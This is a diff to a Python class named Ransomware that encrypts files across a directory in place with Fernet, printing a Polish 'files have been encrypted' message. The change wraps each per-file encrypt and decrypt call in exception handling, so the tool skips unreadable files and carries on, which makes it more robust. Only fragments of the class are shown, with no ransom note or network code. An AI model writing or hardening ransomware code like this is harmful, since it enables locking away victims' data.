@@ -16,11 +16,14 @@ class Ransomware:
         return key
 
     def encrypt_file(self, file_path: str, cipher: Fernet) -> None:
-        with open(file_path, "rb") as file:
-            file_data = file.read()
-        encrypted_data = cipher.encrypt(file_data)
-        with open(file_path, "wb") as file:
-            file.write(encrypted_data)
+        try:
+            with open(file_path, "rb") as file:
+                file_data = file.read()
+            encrypted_data = cipher.encrypt(file_data)
+            with open(file_path, "wb") as file:
+                file.write(encrypted_data)
+        except Exception as e:
+            print("Could not encrypt file " + file_path + ": " + str(e))
 
     def encrypt_files(self, directory_with_files: str) -> None:
         if os.path.exists(".encrypt_key"):
@@ -39,11 +42,14 @@ class Ransomware:
         print("Pliki zostaly zaszyfrowane")
 
     def decrypt_file(self, file_path: str, cipher: Fernet) -> None:
-        with open(file_path, "rb") as file:
-            encrypted_data = file.read()
-        decrypted_data = cipher.decrypt(encrypted_data)
-        with open(file_path, "wb") as file:
-            file.write(decrypted_data)
+        try:
+            with open(file_path, "rb") as file:
+                encrypted_data = file.read()
+            decrypted_data = cipher.decrypt(encrypted_data)
+            with open(file_path, "wb") as file:
+                file.write(decrypted_data)
+        except Exception as e:
+            print("Could not decrypt file " + file_path + ": " + str(e))
 
     def decrypt_files(self, directory_with_files: str) -> None:
         key = self.load_key()
